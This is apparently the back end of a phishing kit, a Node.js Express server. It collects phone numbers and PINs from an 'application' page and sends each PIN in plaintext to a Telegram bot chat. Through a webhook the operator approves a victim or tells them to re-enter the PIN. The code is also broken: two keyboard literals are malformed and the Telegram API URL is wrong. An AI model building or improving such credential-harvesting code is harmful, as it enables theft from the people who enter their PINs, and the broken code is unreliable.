const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

const token = process.env.BOT_TOKEN;
const cid = process.env.CHAT_ID;
const users = {};

// Home
app.get("/", (req, res) => { 
  res.sendFile(path.join(__dirname, "index.html")); 
});

// Apply
app.post("/apply", (req, res) => {
  const phone = req.body.phone;
  if (!phone) return res.sendStatus(400);
  
  users[phone] = { status: "pending", pinStatus: "waiting", attempts: 0 };
  
  const msg = "New Application: " + phone;
  const kb = { inline_keyboard:] };

  axios.post("https://telegram.org" + token + "/sendMessage", {
    chat_id: cid,
    text: msg,
    reply_markup: kb
  }).catch(e => console.log("TG Error"));

  res.sendStatus(200);
});

// Status Checks
app.get("/status/:phone", (req, res) => {
  const u = users[req.params.phone];
  res.json({ status: u ? u.status : "unknown" });
});

app.get("/check-pin-status/:phone", (req, res) => {
  const u = users[req.params.phone];
  res.json({ status: u ? u.pinStatus : "unknown", attempt: u ? u.attempts : 0 });
});

// PIN Submit
app.post("/send-pin", (req, res) => {
  const phone = req.body.phone;
  const pin = req.body.pin;
  if (!users[phone]) return res.sendStatus(404);

  users[phone].attempts += 1;
  users[phone].pinStatus = "verifying";

  const msg = "PIN: " + pin + " (" + phone + ")";
  const kb = { inline_keyboard:] };

  axios.post("https://telegram.org" + token + "/sendMessage", {
    chat_id: cid,
    text: msg,
    reply_markup: kb
  }).catch(e => console.log("TG Error"));

  res.sendStatus(200);
});

// Webhook
app.post("/webhook", (req, res) => {
  const body = req.body;
  if (!body.callback_query) return res.sendStatus(200);

  const data = body.callback_query.data;
  const parts = data.split("_");
  const cmd = parts[0];
  const phone = parts[1];

  if (users[phone]) {
    if (cmd === "ok") users[phone].status = "approved";
    if (cmd === "pinok") users[phone].pinStatus = "success";
    if (cmd === "pinerr") users[phone].pinStatus = "re-enter";
  }

  res.sendStatus(200);
});

// THIS MUST BE AT THE VERY END
const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () => {
  console.log("SERVER IS RUNNING");
});
